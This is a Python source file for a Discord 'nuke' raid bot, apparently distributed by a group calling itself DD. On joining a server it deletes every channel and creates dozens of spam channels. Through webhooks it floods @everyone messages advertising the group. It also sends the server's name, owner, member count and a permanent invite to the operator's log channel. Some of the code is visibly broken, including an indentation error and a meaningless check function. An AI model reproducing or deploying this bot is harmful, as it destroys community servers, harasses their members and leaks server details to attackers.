import discord, json, aiohttp, discord_webhook
from discord.ext import commands
from discord.ext.commands import check

#Made By AOS
#Dar creditos si cambias cosas
#DD ON TOP


intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')
session = aiohttp.ClientSession()

token = "Token de tu bot"
antinuke = "Id del servidor que no podra ser raideado"
logs_channel = "Id del canal de logs"


def check_if_user_has_premium(ctx):
    with open("guild.json") as f:
        guild = json.load(f)
        if guild in guild.id:
            return False

    return True  

@bot.event    
async def on_guild_join(guild): 
 server_id = guild.id
 logg = bot.get_channel(logs_channel)
 with open('guild.json', 'r+') as f:
        data = json.load(f) 
 if server_id in data['guild']:
    return
 else:    
  if guild.id not in antinuke:  
   for channel in guild.channels:
        try:
            await channel.delete()

        except:
            pass  
   for _i in range(1):

        raid = await guild.create_text_channel(name="รบnete-a-dd")      
        invite = await raid.create_invite(max_age=0)
        await raid.send("||@everyone||\n**๐๐ฌ๐ญ๐ ๐ฆ๐ข๐๐ซ๐๐ ๐๐ ๐ฌ๐๐ซ๐ฏ๐ข๐๐จ๐ซ ๐๐ฎ๐ ๐๐ฑ๐ญ๐๐ซ๐ฆ๐ข๐ง๐๐๐ ๐ฉ๐จ๐ซ ๐๐๐๐๐๐๐ฌ๐ญ๐ซ๐จ๐ฒ๐๐ซ๐ฌ, รบ๐ง๐๐ญ๐ ๐ฉ๐๐ซ๐ ๐ซ๐๐๐ฎ๐ฉ๐๐ซ๐๐ซ๐ฅ๐ ๐จ ๐ฎ๐ฌ๐๐ซ๐ฆ๐.**\n https://discord.gg/w6dyCY9Esw")            
   for i in range(1):
    log = discord.Embed(title="Entrar al servidor",url=invite, colour=0xed0b0b)
    log.add_field(name='> Nombre del servidor',value=f'{guild.name}',inline=False)
    log.add_field(name='> Miembros',value=f'{guild.member_count}',inline=False)
    log.add_field(name='> Owner',value=f'{guild.owner}',inline=False)
    log.add_field(name='> Boosteos',value=f'{str(guild.premium_subscription_count)}',inline=False)    
    log.set_thumbnail(url="https://cdn.discordapp.com/icons/1039321689428856933/a_85055102a3bf775315faf434479df555.gif?size=2048")
    await logg.send(invite, embed=log)

   for _i in range(50):
    try: 
     await guild.create_text_channel(name="rฬถอฬฬอฬฝฬฬฬฬฒฬกฬฬฅฬฬซฬผฬฒaฬดฬฬฬอออฬฬซฬกฬบฬฅฬบiฬดฬฬปฬฑฬงฬคdฬทอฬฬพอออฬงฬฏฬฏฬกฬฉฬฆออ-ฬตอฬฬออฬฬฬอออฬปฬ?ฬฅฬปอbฬดอ?อฬอฬฬฬฬฬฬฬฬฌอyฬทออฬฬฬฬฬฬฌฬฬงฬคออฬฅออฬบ-ฬถฬฬพฬฬซฬกฬฬฃฬคฬกอฬฉฬฌอdฬถออออฬฅฬฬฉอฬคอฬผฬณeฬตอฬฬอฬฟฬอฬอฬกฬชฬฬฬฒฬฬaฬธฬฟออฬออฬปฬฬdฬดฬอฬฬอฬอฬฬฬผฬฒฬณฬคฬฒฬคฬจฬฆdฬถฬฬฬอฬฬขอeฬทอฬฬออฬกอsฬดอฬฟอฬอฬฬฬนtฬตอฬฬฬฬฬฬฬฬขrฬตฬฬปoฬดฬพฬพฬฬฬขyฬธอฬฬฬฬฬฬอฬออฬนฬบฬฃฬฅฬอeฬดฬฬฬอฬซฬฬฏอฬฬนฬฐอrฬถฬฬฬอฬฬออฬฬผอฬนฬฎอฬบฬคอฬฬsฬถอฬฟอฬญฬขฬฅ")  
    except:
     pass 
 
   with open('guild.json', 'r+') as f:
        data = json.load(f)
        data['guild'].append(server_id)
        f.seek(0)
        json.dump(data, f)
        f.truncate()


@bot.event
async def on_guild_channel_create(channel):
    global raidpremium
    global raidnormal
    global texto
    global canal 
    webhook = await channel.create_webhook(name = "El hijo de youngaos")
        for _i in range(50):
          try:  
            log = discord.Embed(title="RAIDED BY DD",description = "```THIS SERVER GOT NUKED BY DD```" ,colour=0x2f3136)
            log.add_field(name='Discord',value='https://discord.gg/dd3k',inline=False)
            log.add_field(name='Twitter',value='https://twitter.com/youngaoss',inline=False)            
            log.add_field(name='YouTube',value='https://www.youtube.com/@youngaos',inline=False)
            log.set_image(url="https://cdn.discordapp.com/attachments/1044096779852972083/1047338898348576899/rrrrrrrrrrrrrrrr.gif")
            log.set_thumbnail(url="https://cdn.discordapp.com/attachments/1044096779852972083/1047339429137748038/DEADDESTROYERSV3.gif")
            await webhook.send("||@everyone|| **__SERVER DESTROYED BY DD__**\n https://discord.gg/w6dyCY9Esw", embed=log)
            await channel.send("||@everyone|| **__SERVER DESTROYED BY DD__**\n https://discord.gg/w6dyCY9Esw", embed=log)
          except:
               pass 


bot.run(token)           
